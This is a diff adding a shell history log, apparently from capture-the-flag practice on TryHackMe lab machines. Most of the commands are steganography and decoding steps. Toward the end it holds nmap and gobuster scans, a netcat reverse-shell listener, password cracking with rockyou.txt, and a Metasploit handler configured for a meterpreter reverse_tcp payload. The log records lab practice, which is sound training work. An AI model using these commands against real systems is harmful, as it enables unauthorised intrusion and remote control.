@@ -1,0 +1,192 @@
+    1  sudo apt install openvpn
+    2  curl 10.10.10.10/whoami
+    3  ping 10.10.34.163
+    4  ^[[200~ gobuster dir -u http://10.10.34.163/ -w /usr/share/wordlists/dirb/common.txt --timeout 5s -t 50~
+    5  mousepad shell.py
+    6  cd /
+    7  cd media
+    8  ls
+    9  cd /usr/share/wordlists
+   10  ls
+   11  gobuster dir -u http://10.10.34.163 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt\n
+   12  gobuster dir -u http://10.10.34.163 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+   13  nmap -p 21,22,23,25,53,69,110,143,443,990,989,2121 -T4 -A -sC -sV 10.10.34.163\n
+   14  nmap -T4 -A -sC -sV 10.10.34.163\n
+   15  nano shell.py
+   16  sudo apt update && sudo apt upgrade
+   17  sudo apt install openvpn
+   18  sudo openvpn sankalpvb.ovpn
+   19  ifconfig
+   20  ping google.com
+   21  sudo openvpn sankalpvb.ovpn
+   22  nano shello.php
+   23  ls
+   24  cp shello.php ~/Desktop
+   25  cd Desktop
+   26  ls
+   27  ls
+   28  cp payload.php Desktop
+   29  ls
+   30  cd Desktop
+   31  ls
+   32  nano shell.py
+   33  cat shell.py
+   34  nc -lvnp 4444
+   35  ^[[200~msfconsole
+   36  msfconsole
+   37  msfconsole -q
+   38  exit
+   39  clear
+   40  sudo openvpn sankalpvb.ovpn
+   41  close
+   42  exit
+   43  exit
+   44  cd Downloads
+   45  ls
+   46  exiftool imeage.jpg
+   47  exit
+   48  cd /usr/share/wordlists
+   49  ls
+   50  rockyou.txt.gz
+   51  rockyou.txt
+   52  unzip rockyou.txt.gz
+   53  sudo unzip rockyou.txt.gz
+   54  cd Downloads
+   55  exiftool imeage2.jpg
+   56  strings imeage2.jpg
+   57  binwalk imeage2.jpg
+   58  binwalk -e imeage2.jpg
+   59  steghide info imeage2.jpg
+   60  identify imeage2.jpg
+   61  steghide info imeage2.jpg
+   62  steghide extract -sf imeage2.jpg\n
+   63  stegcracker imeage2.jpg  /usr/share/wordlists/rockyou.txt
+   64  firefox tryhackme.com
+   65  cd Downloads
+   66  zbarimg
+   67  zbarimg QR.png
+   68  clear
+   69  file hello_1577977122465.hello
+   70  cat hello_1577977122465.hello
+   71  less hello_1577977122465.hello
+   72  binwalk hello_1577977122465.hello
+   73  ls
+   74  mv filename.hello filename.jpg
+   75  mv hello_1577977122465.hello hello.jpg
+   76  ls
+   77  exiftool hello.jpg
+   78  clear
+   79  steghide info hello_1577977122465.hello
+   80  zsteg hello_1577977122465.hello
+   81  xxd hello_1577977122465.hello | head
+   82  echo "hello_1577977122465.hello" | rev
+   83  xxd hello_1577977122465.hello | head\n
+   84  cat hello_1577977122465.hello | base64 -d
+   85  tac hello_1577977122465.hello  # Reverse line order\nrev hello_1577977122465.hello  # Reverse text content\n
+   86  cat hello_1577977122465.hello | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13\n
+   87  clear
+   88  ^[[200~file image.png
+   89  file spoil_1577979329740.png
+   90  pngcheck -v spoil_1577979329740.png
+   91  xxd spoil_1577979329740.png | head\n
+   92  hexedit spoil_1577979329740.png\n
+   93  binwalk -e spoil_1577979329740.png\n
+   94  steghide extract -sf spoil_1577979329740.png\n
+   95  convert spoil_1577979329740.png fixed.png\n
+   96  cat spo
+   97  cat spoil_1577979329740.png
+   98  clear
+   99  xxd spoil_1577979329740.png | head
+  100  hexedit spoil_1577979329740.png
+  101  cd dow
+  102  cd Downloads
+  103  ls
+  104  xxd —plain spoil_1577979329740.png | head
+  105  xxd — plain spoil_1577979329740.png | head
+  106  xxd -p spoil_1577979329740.png | head
+  107  xxd -ps spoil_1577979329740.png | head
+  108  xxd --plain spoil_1577979329740.png | head
+  109  gedit 
+  110  gedit spoil_1577979329740.png
+  111  gedit spoil_1577979329740.txt&
+  112  gedit spoil_1577979329740.png
+  113  exit
+  114  sudo apt install bf
+  115  sudo apt install bf  # If not installed\necho "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.------------.+++++.>+++++++++++++++++++++++.<<++++++++++++++++++.>>-------------------.---------.++++++++++++++.++++++++++++.<++++++++++++++++++.+++++++++.<+++.+.>----.>++++." | bf\n
+  116  Brainfuck 
+  117  sudo apt install Brainfuck
+  118  sudo apt update 
+  119  apt list --upgradable
+  120  sudo apt install bf  # If not installed\necho "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.------------.+++++.>+++++++++++++++++++++++.<<++++++++++++++++++.>>-------------------.---------.++++++++++++++.++++++++++++.<++++++++++++++++++.+++++++++.<+++.+.>----.>++++." | bf\n
+  121  mousepad shell.py
+  122  python3 shell.py
+  123  mousepad shell.py
+  124  python3 shell.py
+  125  mousepad shell.py
+  126  python3 shell.py
+  127  mousepad shell.py
+  128  python3 shell.py
+  129  python shell.py
+  130  mousepad shell11.py
+  131  python3 shell11.py
+  132  echo -n "eef2f7c189c2d9d6cf8f8bcc89e58ac7" | xxd -r -p
+  133  echo -n "eef2f7c189c2d9d6cf8f8bcc89e58ac7" | base64 -d\n
+  134  s2_xor_value = 0x55  # Alternate XOR key
+  135  python3
+  136  cd dow
+  137  cd Downloads
+  138  ls
+  139  binwalk hell_1578018688127.jpg
+  140  binwalk -e hell_1578018688127.jpg
+  141  ls
+  142  cd _hell_1578018688127.jpg.extracted
+  143  ls -la
+  144  unzip 40E75.zip
+  145  ls
+  146  strings howitis
+  147  java -jar Stagsolve.jar
+  148  cd ..
+  149  java -jar Stagsolve.jar
+  150  ls
+  151  java -jar Stegsolve.jar
+  152  ls
+  153  zbarimg QRCTF_1579095601577.png
+  154  qrencode -d -t ASCII QRCTF_1579095601577.png
+  155  zbarimg QRCTF_1579095601577.png
+  156  steghide extract -sf audio.wav
+  157  steghide extract -sf audio.wav -p ""
+  158  steghide extract -sf audio2.wav -p ""
+  159  steghide extract -sf audio2.wav -p""
+  160  steghide extract -sf audio2.wav
+  161  steghide extract -sf QRCTF_1579095601577.png
+  162  steghide extract -sf QRCTF_1579095601577.png -p""
+  163  tesseract QRCTF_1579095601577.png output.txt\ncat output.txt
+  164  sudo apt install cryptools
+  165  sudo apt update 
+  166  sudo apt install cryptools
+  167  bye
+  168  nano ~/.bashrc\n
+  169  source ~/.bashrc
+  170  bye
+  171  printf '%x\n' 581695969015253365094191591547859387620042736036246486373595515576333693
+  172  printf '%x\n' 581695969015253365094191591547859387620042736036246486373595515576333693 > hexvalue.txt
+  173  ls
+  174  echo "581695969015253365094191591547859387620042736036246486373595515576333693" | xxd -r -p
+  175  echo -n "581695969015253365094191591547859387620042736036246486373595515576333693" | python3 -c 'import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode())'
+  176  mousepad hehehe.py
+  177  python3 hehehe.py
+  178  bye
+  179  sudo bye
+  180  bye
+  181  sudo openvpn sankalpvb.ovpn
+  182  bye
+  183  sudo apt install curl\n\nsudo curl -fsSLo /usr/share/keyrings/brave-browser-archive-keyring.gpg https://brave-browser-apt-release.s3.brave.com/brave-browser-archive-keyring.gpg\n\necho "deb [signed-by=/usr/share/keyrings/brave-browser-archive-keyring.gpg] https://brave-browser-apt-release.s3.brave.com/ stable main"|sudo tee /etc/apt/sources.list.d/brave-browser-release.list\n\nsudo apt update\n\nsudo apt install brave-browser
+  184  ping 10.10.62.4
+  185  nmap -T4 -A -sC -sV 10.10.62.4
+  186  ping 10.10.62.4
+  187  nmap -T4 -A -sC -sV 10.10.62.4
+  188  sudo openvpn sankalpvb.ovpn
+  189  ping 10.10.223.2
+  190  nmap -T4 -A -sC -sV 10.10.223.2
+  191  msfconsole -q
+  192  msfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.17.49.71\nset LPORT 4444\nset ExitOnSession false\nexploit -j
